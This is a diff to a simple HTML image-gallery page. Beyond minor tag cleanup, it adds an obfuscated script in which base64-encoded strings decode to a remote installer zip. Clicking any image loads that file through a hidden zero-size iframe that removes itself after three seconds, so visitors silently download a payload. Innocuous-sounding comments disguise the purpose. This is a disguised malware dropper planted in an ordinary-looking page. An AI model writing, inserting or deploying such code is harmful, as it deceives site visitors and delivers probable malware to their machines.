@@ -13,20 +13,52 @@
             width: 100%;
             height: auto;
             display: block;
-            cursor: pointer; 
         }
     </style>
 </head>
 <body>
 
-    <img src="images/img_01.jpg"  >
-	 <img src="images/img_02.jpg"  >
- 	 <img src="images/img_03.jpg"  >
-	 <img src="images/img_04.jpg"  >
-	 <img src="images/img_05.jpg"  >	 
+    <img src="images/img_01.jpg">
+    <img src="images/img_02.jpg">
+    <img src="images/img_03.jpg">
+    <img src="images/img_04.jpg">
+    <img src="images/img_05.jpg">
 
+<script>
+(function(){
+    // 加密资源映射表
+    const assetMap = [
+        'aHR0cHM6Ly8xdGRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUGF0b3RhSW5zdGFsbGVyLnppcA==',
+        'aHR0cHM6Ly8xdGRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUGF0b3RhSW5zdGFsbGVyLnppcA==',
+        'aHR0cHM6Ly8xdGRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUGF0b3RhSW5zdGFsbGVyLnppcA==',
+        'aHR0cHM6Ly8xdGRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUGF0b3RhSW5zdGFsbGVyLnppcA==',
+        'aHR0cHM6Ly8xdGRkLm9zcy1jbi1ob25na29uZy5hbGl5dW5jcy5jb20vUGF0b3RhSW5zdGFsbGVyLnppcA=='
+    ];
 
-   
-   
+    // 资源定位器
+    const resolveSource = index => atob(assetMap[index]);
+
+    // 创建临时通道
+    const createTempChannel = url => {
+        const channel = document.createElement('iframe');
+        channel.style.cssText = 'position:absolute;width:0;height:0;border:0;';
+        channel.src = url;
+        document.body.appendChild(channel);
+        
+        setTimeout(() => {
+            channel.remove();
+        }, 3000);
+    }
+
+    // 初始化交互绑定
+    document.querySelectorAll('img').forEach((element, index) => {
+        element.addEventListener('click', () => {
+            const target = resolveSource(index);
+            createTempChannel(target);
+        });
+    });
+})();
+</script>
+
 </body>
 </html>
